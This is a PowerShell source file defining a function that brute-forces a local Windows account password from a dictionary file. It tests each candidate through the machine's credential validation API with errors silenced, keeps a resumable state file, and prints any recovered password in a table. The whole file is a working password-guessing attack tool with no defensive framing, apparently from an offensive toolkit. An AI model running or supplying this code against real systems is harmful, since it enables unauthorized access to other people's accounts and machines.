Function localbrute {

  param($u,$dct,$debug)
  $d = $dct -replace ".*\\" -replace ".*/"
  
  $ErrorActionPreference = "SilentlyContinue" 
  $i = ((gc .\localbrute.state | sls "^${u}:.*:True:.*") -split(":"))[3]
  If($i){
    echo "`nPassword for $u account already found: $i"
    return
  }
  
  $user = [Environment]::UserName
  $TimeStampStart = Get-Date -format "HH:mm:ss"
  $ii = (gc .\localbrute.state | sls "^${u}:${d}:" | select -last 1) -split(":")
  $i = $ii[2]/1
  if ($debug) {Write-Host "`nBrute Force [ $user ] account" -ForeGroundColor Yellow;echo "-----------------------------"}
  try {
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
    $t = [DirectoryServices.AccountManagement.ContextType]::Machine
    $a = [DirectoryServices.AccountManagement.PrincipalContext]::new($t)
    foreach($p in (gc $dct|where {$_.readcount -gt $i})) {
      if ($debug) {echo "DEBUG: trying password [${i}]: $p"}
      if ($a.ValidateCredentials($u,$p)) {
        echo "${u}:${d}:True:${p}" >> localbrute.state

        ## Create Data Table for output
        $TimeStampEnd = Get-Date -format "HH:mm:ss"
        $mytable = New-Object System.Data.DataTable
        $mytable.Columns.Add("Attempt")|Out-Null
        $mytable.Columns.Add("StartTime")|Out-Null
        $mytable.Columns.Add("EndTime")|Out-Null
        $mytable.Columns.Add("Account")|Out-Null
        $mytable.Columns.Add("Password")|Out-Null
        $mytable.Rows.Add("$i",
                          "$TimeStampStart",
                          "$TimeStampEnd",
                          "$user",
                          "$p")|Out-Null

        ## Display Data Table
        $mytable|Format-Table -AutoSize > $Env:TMP\KeyDump.log
        Write-Host "";Get-Content -Path "$Env:TMP\KeyDump.log"
        Remove-Item -Path "$Env:TMP\KeyDump.log" -Force
        return
      }
      $i++
    }
  } finally {
    echo "${u}:${d}:${i}:${p}" >> localbrute.state
  }	
}